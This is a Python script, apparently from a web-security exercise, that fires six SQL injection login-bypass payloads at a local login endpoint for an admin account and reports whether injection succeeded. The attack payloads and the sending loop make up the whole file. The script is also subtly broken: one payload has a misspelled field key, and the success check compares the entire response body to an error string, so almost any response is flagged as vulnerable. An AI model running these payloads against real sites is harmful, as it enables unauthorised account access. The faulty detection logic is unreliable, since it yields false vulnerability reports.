import requests
from bs4 import BeautifulSoup


def input_values(email):
    """returns 6 different values of SQL injection of email and passwords"""
    attack_1 = {"email": email,
                "password": "' or '1'='1	"}
    attack_2 = {"email:": email,
                "password": "' or 1='1	"}
    attack_3 = {"email": email,
                "password": "1' or 1=1 -- -	"}
    attack_4 = {"email": "' or '1'='1	",
                "password": "' or '1'='1	"}
    attack_5 = {"email": "' or ' 1=1	",
                "password": "' or ' 1=1	"}
    attack_6 = {"email": "1' or 1=1 -- -	",
                "password": "12345678"}
    values_list = [attack_1, attack_2, attack_3, attack_4, attack_5, attack_6]
    return values_list


def check_login(url, values):
    """scans the website and returns True if sql vulnerabilities are found, False otherwise"""
    is_vulnerable = False
    for input_value in values:
        response = requests.post(url, data=input_value)
        bs = BeautifulSoup(response.text, "html.parser")
        messageList = bs.find_all("div", {"class": "message"})  # finds message's attributes on the pages
        web_warning_message = 'Invalid email or password.'
        web_response = response.text
        if web_response != (web_warning_message):
            print(f"[+] SQL INJECTION detected on {url}")
            print(f"[*] input values:")
            print(input_value)
            is_vulnerable = True

    return f"\nSQL INJECTION VULNERABILITY STATUS; {is_vulnerable}"


if __name__ == "__main__":
    try:
        print("\t-- SQL INJECTION ATTACK --\n")
        print(f"Default email\t[admin@gmail.com]\nDefault url\t[http://localhost:3000/rest/user/login]\n")
        email = "admin@gmail.com"  # Existing email
        url = "http://localhost:3000/rest/user/login"
        values = input_values(email)
        print(check_login(url, values))
    except:
        print("SYSTEM MESSAGE:\n\t[X] Automatic test failed...")
